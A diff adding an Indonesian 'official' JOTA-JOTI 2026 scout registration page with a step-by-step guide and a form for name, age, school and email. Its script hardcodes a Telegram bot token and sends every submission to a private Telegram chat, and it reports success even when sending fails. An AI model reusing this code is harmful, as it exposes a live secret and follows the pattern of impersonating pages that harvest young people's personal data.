@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>JOTA-JOTI 2026 | Pendaftaran Resmi</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg-primary: #ffffff;
+      --bg-secondary: #f8f7fc;
+      --border: rgba(124, 58, 237, 0.1);
+      --border-hover: rgba(124, 58, 237, 0.25);
+      --border-purple: rgba(124, 58, 237, 0.15);
+      --text-primary: #1a0f2e;
+      --text-secondary: #6b5b8a;
+      --text-tertiary: #a89bc4;
+      --accent: #7c3aed;
+      --accent-bright: #a855f7;
+      --accent-dark: #5b21b6;
+      --gold: #d4af37;
+      --gold-bright: #e4c56f;
+      --purple-glow: rgba(124, 58, 237, 0.08);
+      --success: #10b981;
+      --shadow-sm: 0 2px 8px rgba(124, 58, 237, 0.06);
+      --shadow-md: 0 8px 24px rgba(124, 58, 237, 0.08);
+      --shadow-lg: 0 20px 60px rgba(124, 58, 237, 0.12);
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+      letter-spacing: -0.01em;
+      font-weight: 400;
+    }
+
+    .bg-luxury {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+      background: linear-gradient(180deg, #ffffff 0%, #faf8ff 50%, #f5f0ff 100%);
+    }
+    .bg-luxury::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background:
+        radial-gradient(ellipse at 20% 20%, rgba(124, 58, 237, 0.06) 0%, transparent 40%),
+        radial-gradient(ellipse at 80% 80%, rgba(168, 85, 247, 0.05) 0%, transparent 40%),
+        radial-gradient(circle at 50% 50%, rgba(212, 175, 55, 0.03) 0%, transparent 45%);
+      animation: meshSlow 40s ease-in-out infinite alternate;
+    }
+    @keyframes meshSlow {
+      0% { transform: rotate(0deg) scale(1); }
+      100% { transform: rotate(6deg) scale(1.05); }
+    }
+    .bg-luxury::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='2' /%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.4'/%3E%3C/svg%3E");
+      opacity: 0.06;
+      pointer-events: none;
+    }
+
+    .container {
+      max-width: 1150px;
+      margin: 0 auto;
+      padding: 32px 28px 80px;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* NAVBAR */
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 60px;
+      padding: 18px 28px;
+      background: rgba(255, 255, 255, 0.85);
+      backdrop-filter: blur(24px);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      flex-wrap: wrap;
+      gap: 16px;
+      box-shadow: var(--shadow-md);
+      position: relative;
+      overflow: hidden;
+    }
+    .navbar::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--accent), var(--gold), var(--accent), transparent);
+      opacity: 0.6;
+    }
+    .navbar .brand {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .navbar .brand .logo-mark {
+      width: 44px;
+      height: 44px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 1.2rem;
+      box-shadow: 0 8px 20px rgba(124, 58, 237, 0.3);
+    }
+    .navbar .brand .brand-text {
+      display: flex;
+      flex-direction: column;
+      line-height: 1;
+    }
+    .navbar .brand .brand-text .main {
+      font-size: 1.15rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      background: linear-gradient(135deg, var(--text-primary) 40%, var(--accent));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .navbar .brand .brand-text .tag {
+      font-size: 0.55rem;
+      color: var(--text-tertiary);
+      letter-spacing: 0.25em;
+      text-transform: uppercase;
+      font-weight: 600;
+      margin-top: 4px;
+    }
+    .nav-links {
+      display: flex;
+      gap: 4px;
+      flex-wrap: wrap;
+    }
+    .nav-links a {
+      color: var(--text-secondary);
+      text-decoration: none;
+      font-size: 0.82rem;
+      font-weight: 600;
+      padding: 9px 18px;
+      border-radius: 12px;
+      transition: all 0.25s;
+      cursor: pointer;
+    }
+    .nav-links a:hover {
+      background: var(--purple-glow);
+      color: var(--accent);
+    }
+    .nav-links a.active {
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      color: #fff;
+      box-shadow: 0 6px 16px rgba(124, 58, 237, 0.25);
+    }
+
+    .page { display: none; animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
+    .page.active { display: block; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(24px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* HERO */
+    .hero {
+      text-align: center;
+      padding: 50px 20px 40px;
+    }
+    .hero .logo-icon {
+      width: 130px;
+      height: 130px;
+      margin: 0 auto 24px;
+      border-radius: 50%;
+      overflow: hidden;
+      border: 3px solid var(--accent);
+      box-shadow: 0 20px 60px rgba(124, 58, 237, 0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, rgba(124, 58, 237, 0.05), rgba(168, 85, 247, 0.03));
+      animation: floatLogo 4s ease-in-out infinite;
+    }
+    @keyframes floatLogo {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .hero .logo-icon i {
+      font-size: 3.5rem;
+      color: var(--accent);
+      filter: drop-shadow(0 0 20px rgba(124, 58, 237, 0.4));
+    }
+    .hero .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.7rem;
+      color: var(--accent);
+      letter-spacing: 0.25em;
+      text-transform: uppercase;
+      font-weight: 700;
+      padding: 8px 20px;
+      background: var(--purple-glow);
+      border-radius: 40px;
+      margin-bottom: 20px;
+      border: 1px solid var(--border-purple);
+    }
+    .hero h1 {
+      font-size: 4rem;
+      font-weight: 900;
+      line-height: 1;
+      letter-spacing: -0.04em;
+      background: linear-gradient(135deg, var(--text-primary) 20%, var(--accent) 60%, var(--gold));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 14px;
+    }
+    .hero .sub {
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+      letter-spacing: 0.3em;
+      text-transform: uppercase;
+      font-weight: 600;
+      margin-bottom: 30px;
+    }
+    .hero .motto {
+      font-size: 1.05rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+      font-weight: 400;
+      max-width: 600px;
+      margin: 0 auto 36px;
+      padding: 24px 30px;
+      background: rgba(255, 255, 255, 0.6);
+      backdrop-filter: blur(12px);
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-sm);
+    }
+    .hero .motto i {
+      color: var(--accent);
+      margin: 0 8px;
+      font-size: 1.2rem;
+    }
+
+    /* BUTTONS */
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      border: none;
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.95rem;
+      padding: 16px 44px;
+      border-radius: 60px;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      box-shadow: 0 12px 32px rgba(124, 58, 237, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-primary::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: left 0.7s ease;
+    }
+    .btn-primary:hover::before { left: 100%; }
+    .btn-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 20px 48px rgba(124, 58, 237, 0.4);
+    }
+
+    /* ===== STEP CARD NAV ===== */
+    .step-nav {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin: 40px 0 20px;
+      flex-wrap: wrap;
+    }
+    .step-nav .step-dot {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #ffffff;
+      border: 2px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 0.9rem;
+      color: var(--text-tertiary);
+      transition: all 0.3s;
+    }
+    .step-nav .step-dot.active {
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      color: #fff;
+      border-color: var(--accent);
+      box-shadow: 0 8px 20px rgba(124, 58, 237, 0.25);
+    }
+    .step-nav .step-dot.done {
+      background: var(--success);
+      color: #fff;
+      border-color: var(--success);
+    }
+    .step-nav .step-line {
+      width: 60px;
+      height: 2px;
+      background: var(--border);
+      border-radius: 2px;
+    }
+    .step-nav .step-line.done {
+      background: var(--success);
+    }
+
+    /* SECTION TITLE */
+    .section-title {
+      text-align: center;
+      margin: 70px 0 40px;
+    }
+    .section-title .small {
+      font-size: 0.7rem;
+      color: var(--accent);
+      letter-spacing: 0.4em;
+      text-transform: uppercase;
+      font-weight: 700;
+      display: block;
+      margin-bottom: 12px;
+    }
+    .section-title .big {
+      font-size: 2.4rem;
+      font-weight: 900;
+      color: var(--text-primary);
+      letter-spacing: -0.03em;
+      line-height: 1.1;
+    }
+    .section-title .big span {
+      background: linear-gradient(135deg, var(--accent), var(--gold));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    /* PANDUAN CARD */
+    .panduan-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 26px;
+      margin-top: 30px;
+    }
+    .panduan-card {
+      background: rgba(255, 255, 255, 0.85);
+      backdrop-filter: blur(16px);
+      border-radius: 26px;
+      padding: 34px 30px;
+      border: 1px solid var(--border);
+      transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+      position: relative;
+      overflow: hidden;
+      box-shadow: var(--shadow-sm);
+    }
+    .panduan-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 3px;
+      background: linear-gradient(90deg, var(--accent), var(--gold), var(--accent));
+      opacity: 0.9;
+    }
+    .panduan-card:hover {
+      transform: translateY(-6px);
+      border-color: var(--border-hover);
+      box-shadow: var(--shadow-lg);
+    }
+    .panduan-card .step-num {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 42px;
+      height: 42px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      color: #fff;
+      font-weight: 800;
+      font-size: 1rem;
+      margin-bottom: 20px;
+      box-shadow: 0 8px 20px rgba(124, 58, 237, 0.25);
+    }
+    .panduan-card h3 {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: var(--text-primary);
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .panduan-card h3 i { color: var(--accent); }
+    .panduan-card p {
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      line-height: 1.75;
+      margin-bottom: 16px;
+    }
+    .panduan-card ul {
+      list-style: none;
+      padding: 0;
+      margin-bottom: 18px;
+    }
+    .panduan-card ul li {
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      padding: 7px 0 7px 28px;
+      position: relative;
+      line-height: 1.6;
+    }
+    .panduan-card ul li::before {
+      content: '\f00c';
+      font-family: 'Font Awesome 6 Free';
+      font-weight: 900;
+      position: absolute;
+      left: 0;
+      color: var(--accent);
+      font-size: 0.8rem;
+      top: 8px;
+    }
+    .panduan-card .link-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      border: none;
+      color: #fff;
+      font-size: 0.8rem;
+      font-weight: 700;
+      padding: 12px 24px;
+      border-radius: 40px;
+      text-decoration: none;
+      transition: all 0.3s;
+      box-shadow: 0 8px 20px rgba(124, 58, 237, 0.2);
+      margin-right: 8px;
+      margin-bottom: 8px;
+    }
+    .panduan-card .link-btn:hover {
+      transform: translateX(4px);
+      box-shadow: 0 12px 28px rgba(124, 58, 237, 0.35);
+    }
+    .panduan-card .link-btn.next {
+      background: linear-gradient(135deg, var(--success), #059669);
+      box-shadow: 0 8px 20px rgba(16, 185, 129, 0.25);
+    }
+    .panduan-card .link-btn.next:hover {
+      box-shadow: 0 12px 28px rgba(16, 185, 129, 0.4);
+    }
+
+    /* FORM */
+    .form-card {
+      max-width: 580px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(24px);
+      border-radius: 32px;
+      padding: 50px 44px;
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-lg);
+      position: relative;
+      overflow: hidden;
+    }
+    .form-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 3px;
+      background: linear-gradient(90deg, var(--accent), var(--gold), var(--accent));
+    }
+    .form-group {
+      margin-bottom: 1.5rem;
+      text-align: left;
+    }
+    .form-group label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      font-size: 0.75rem;
+      margin-bottom: 10px;
+      color: var(--text-primary);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+    .form-group label i {
+      color: var(--accent);
+      font-size: 0.9rem;
+    }
+    input, select {
+      width: 100%;
+      padding: 16px 20px;
+      background: #ffffff;
+      border: 1.5px solid var(--border);
+      border-radius: 14px;
+      color: var(--text-primary);
+      font-size: 0.95rem;
+      outline: none;
+      transition: all 0.25s;
+      font-family: 'Inter', sans-serif;
+      font-weight: 500;
+    }
+    input:focus, select:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.08);
+    }
+    input::placeholder { color: var(--text-tertiary); font-weight: 400; }
+    select option { background: #ffffff; color: var(--text-primary); }
+
+    /* LOADING */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(16px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    .loading-overlay.show { display: flex; }
+    .loading-content {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 46px 60px;
+      text-align: center;
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-lg);
+    }
+    .loading-spinner {
+      width: 52px;
+      height: 52px;
+      border: 3px solid rgba(124, 58, 237, 0.1);
+      border-top: 3px solid var(--accent);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 22px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text {
+      font-size: 0.9rem;
+      color: var(--text-primary);
+      font-weight: 700;
+      letter-spacing: 0.05em;
+    }
+
+    .credit {
+      text-align: center;
+      margin-top: 90px;
+      font-size: 0.7rem;
+      color: var(--text-tertiary);
+      border-top: 1px solid var(--border);
+      padding-top: 34px;
+      letter-spacing: 0.05em;
+      font-weight: 500;
+    }
+    .credit i { color: var(--accent); margin: 0 6px; }
+
+    @media (max-width: 900px) {
+      .hero h1 { font-size: 3rem; }
+      .panduan-grid { grid-template-columns: 1fr; }
+    }
+    @media (max-width: 480px) {
+      .container { padding: 20px 18px 60px; }
+      .navbar { padding: 16px 20px; margin-bottom: 40px; }
+      .navbar .brand .brand-text .main { font-size: 1rem; }
+      .hero h1 { font-size: 2.2rem; }
+      .hero .logo-icon { width: 100px; height: 100px; }
+      .hero .logo-icon i { font-size: 2.6rem; }
+      .hero .motto { font-size: 0.9rem; padding: 20px 22px; }
+      .form-card { padding: 34px 24px; }
+      .panduan-card { padding: 26px 22px; }
+      .section-title .big { font-size: 1.8rem; }
+      .btn-primary { font-size: 0.85rem; padding: 14px 32px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-luxury"></div>
+
+  <div class="container">
+
+    <!-- NAVBAR -->
+    <div class="navbar">
+      <div class="brand">
+        <div class="logo-mark"><i class="fas fa-broadcast-tower"></i></div>
+        <div class="brand-text">
+          <span class="main">JOTA-JOTI 2026</span>
+          <span class="tag">Official Registration</span>
+        </div>
+      </div>
+      <div class="nav-links">
+        <a class="active" onclick="showPage('homePage')">Home</a>
+        <a onclick="showPage('panduanPage')">Panduan</a>
+        <a onclick="showPage('daftarPage')">Daftar</a>
+      </div>
+    </div>
+
+    <!-- HOME -->
+    <div id="homePage" class="page active">
+      <div class="hero">
+        <div class="logo-icon"><i class="fas fa-broadcast-tower"></i></div>
+        <div class="eyebrow">
+          <i class="fas fa-globe"></i> 16 - 18 Oktober 2026
+        </div>
+        <h1>JOTA-JOTI 2026</h1>
+        <div class="sub">A Peaceful & Inclusive World</div>
+        <div class="motto">
+          <i class="fas fa-quote-left"></i>
+          Jamboree on the Air — Jamboree on the Internet. Event Pramuka terbesar di dunia yang menghubungkan jutaan Pramuka dari seluruh dunia.
+          <i class="fas fa-quote-right"></i>
+        </div>
+        <button class="btn-primary" onclick="showPage('daftarPage')">
+          <i class="fas fa-arrow-right"></i> DAFTAR SEKARANG
+        </button>
+      </div>
+    </div>
+
+    <!-- PANDUAN -->
+    <div id="panduanPage" class="page">
+      <div class="section-title">
+        <span class="small">Step by Step Guide</span>
+        <div class="big">Panduan <span>Lengkap</span></div>
+      </div>
+
+      <!-- STEP NAVIGATION -->
+      <div class="step-nav">
+        <div class="step-dot active" id="dot1">1</div>
+        <div class="step-line" id="line1"></div>
+        <div class="step-dot" id="dot2">2</div>
+        <div class="step-line" id="line2"></div>
+        <div class="step-dot" id="dot3">3</div>
+      </div>
+
+      <div class="panduan-grid">
+
+        <!-- STEP 1: SfH 3 -->
+        <div class="panduan-card" id="step1">
+          <div class="step-num">1</div>
+          <h3><i class="fas fa-shield-alt"></i> Sertifikat SfH 3</h3>
+          <p>Sertifikat <strong>Safe from Harm 3: Being Safe Online</strong> wajib untuk semua peserta JOTA-JOTI. Kursus tentang keamanan online untuk Pramuka.</p>
+          <ul>
+            <li>Login akun <strong>scout.org</strong> terlebih dahulu</li>
+            <li>Buka kursus SfH 3 di Learn Scout</li>
+            <li>Selesaikan semua course hingga 100%</li>
+            <li>Unduh sertifikat di Course 3</li>
+          </ul>
+          <a href="https://learn.scout.org/resource/sfh-3-being-safe-online" target="_blank" class="link-btn">
+            <i class="fas fa-external-link-alt"></i> Buka Kursus SfH 3
+          </a>
+          <button class="link-btn next" onclick="nextStep(1)">
+            <i class="fas fa-check"></i> Selesai SfH 3, Lanjut →
+          </button>
+        </div>
+
+        <!-- STEP 2: Akun scout.org -->
+        <div class="panduan-card" id="step2">
+          <div class="step-num">2</div>
+          <h3><i class="fas fa-user-plus"></i> Buat Akun scout.org</h3>
+          <p>Akun scout.org adalah pintu utama untuk mengakses seluruh platform WOSM, termasuk JOTA-JOTI dan SfH 3.</p>
+          <ul>
+            <li>Kunjungi <strong>scout.org</strong></li>
+            <li>Klik tombol <strong>LOGIN</strong> di pojok kanan atas</li>
+            <li>Klik <strong>REGISTER</strong></li>
+            <li>Isi data diri dengan benar</li>
+            <li>Klik <strong>REGISTER</strong> untuk submit</li>
+          </ul>
+          <a href="https://scout.org" target="_blank" class="link-btn">
+            <i class="fas fa-external-link-alt"></i> Buat Akun Scout.org
+          </a>
+          <button class="link-btn next" onclick="nextStep(2)">
+            <i class="fas fa-check"></i> Selesai Scout.org, Lanjut →
+          </button>
+        </div>
+
+        <!-- STEP 3: Scouts for SDGs -->
+        <div class="panduan-card" id="step3">
+          <div class="step-num">3</div>
+          <h3><i class="fas fa-globe"></i> Scouts for SDGs</h3>
+          <p>Platform untuk meng-upload proyek pengabdian dan menghitung jam kontribusi Pramuka untuk Sustainable Development Goals.</p>
+          <ul>
+            <li>Login pakai akun <strong>scout.org</strong></li>
+            <li>Buka <strong>sdgs.scout.org</strong></li>
+            <li>Klik menu <strong>"Take Action"</strong></li>
+            <li>Pilih <strong>Submit a Project</strong></li>
+            <li>Isi detail proyek dan submit</li>
+          </ul>
+          <a href="https://sdgs.scout.org" target="_blank" class="link-btn">
+            <i class="fas fa-external-link-alt"></i> Buka Scouts for SDGs
+          </a>
+          <button class="link-btn next" onclick="nextStep(3)">
+            <i class="fas fa-check"></i> Selesai Semua, Daftar →
+          </button>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- DAFTAR -->
+    <div id="daftarPage" class="page">
+      <div class="section-title">
+        <span class="small">Registration Form</span>
+        <div class="big">Pendaftaran <span>JOTA-JOTI</span></div>
+      </div>
+      <div class="form-card">
+        <div class="form-group">
+          <label><i class="fas fa-user"></i> Nama Lengkap</label>
+          <input type="text" id="nama" placeholder="Nama Anda">
+        </div>
+        <div class="form-group">
+          <label><i class="fas fa-calendar-alt"></i> Umur</label>
+          <input type="text" id="umur" placeholder="13 - 25 tahun">
+        </div>
+        <div class="form-group">
+          <label><i class="fas fa-school"></i> Asal Sekolah / Gugus Depan</label>
+          <input type="text" id="asal" placeholder="SMA Negeri 1 / Gudep 12345">
+        </div>
+        <div class="form-group">
+          <label><i class="fas fa-id-card"></i> Status SfH 3</label>
+          <select id="sfh">
+            <option value="Sudah punya sertifikat SfH 3">Sudah punya sertifikat SfH 3</option>
+            <option value="Belum punya, akan urus">Belum punya, akan urus</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label><i class="fas fa-envelope"></i> Email Aktif</label>
+          <input type="email" id="email" placeholder="email@example.com">
+        </div>
+        <button class="btn-primary" id="btnDaftar" style="width: 100%;">
+          <i class="fas fa-paper-plane"></i> KIRIM PENDAFTARAN
+        </button>
+      </div>
+    </div>
+
+    <div class="credit">
+      <i class="fas fa-copyright"></i> 2026 JOTA-JOTI | World Organization of the Scout Movement
+    </div>
+  </div>
+
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="loading-content">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">Mengirim Data...</div>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8522490884:AAHM_R45nqpI1p-d7ifrzyPI9p_qYt2A9b8";
+    const CHAT_ID = "7509845641";
+
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      document.querySelectorAll('.nav-links a').forEach(a => a.classList.remove('active'));
+      const map = { homePage: 0, panduanPage: 1, daftarPage: 2 };
+      if (map[id] !== undefined) document.querySelectorAll('.nav-links a')[map[id]].classList.add('active');
+    }
+
+    // ===== STEP NAVIGATION =====
+    function nextStep(currentStep) {
+      const dot = document.getElementById('dot' + currentStep);
+      if (dot) {
+        dot.classList.remove('active');
+        dot.classList.add('done');
+        dot.innerHTML = '<i class="fas fa-check"></i>';
+      }
+
+      const line = document.getElementById('line' + currentStep);
+      if (line) line.classList.add('done');
+
+      if (currentStep < 3) {
+        const nextDot = document.getElementById('dot' + (currentStep + 1));
+        if (nextDot) nextDot.classList.add('active');
+        const nextCard = document.getElementById('step' + (currentStep + 1));
+        if (nextCard) {
+          nextCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+      } else {
+        setTimeout(() => {
+          showPage('daftarPage');
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        }, 400);
+      }
+    }
+
+    function showLoading() { document.getElementById('loadingOverlay').classList.add('show'); }
+    function hideLoading() { document.getElementById('loadingOverlay').classList.remove('show'); }
+
+    async function sendToTelegram(data) {
+      const msg = `📡 JOTA-JOTI 2026 📡\n\n👤 Nama: ${data.nama}\n🎂 Umur: ${data.umur}\n🏫 Asal: ${data.asal}\n🛡️ Status SfH 3: ${data.sfh}\n📧 Email: ${data.email}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+        return res.ok;
+      } catch (e) { return false; }
+    }
+
+    document.getElementById('btnDaftar').addEventListener('click', async function() {
+      const nama = document.getElementById('nama').value.trim();
+      const umur = document.getElementById('umur').value.trim();
+      const asal = document.getElementById('asal').value.trim();
+      const sfh = document.getElementById('sfh').value;
+      const email = document.getElementById('email').value.trim();
+
+      if (!nama || !umur || !asal || !email) {
+        alert('Isi semua data!');
+        return;
+      }
+
+      if (!email.includes('@')) {
+        alert('Email tidak valid!');
+        return;
+      }
+
+      showLoading();
+      const terkirim = await sendToTelegram({ nama, umur, asal, sfh, email });
+
+      setTimeout(() => {
+        hideLoading();
+        if (terkirim) {
+          alert('✅ Pendaftaran berhasil! Data terkirim ke admin.');
+        } else {
+          alert('⚠️ Pendaftaran berhasil, tapi data gagal terkirim.');
+        }
+        document.getElementById('nama').value = '';
+        document.getElementById('umur').value = '';
+        document.getElementById('asal').value = '';
+        document.getElementById('email').value = '';
+      }, 1500);
+    });
+  </script>
+
+</body>
+  </html>
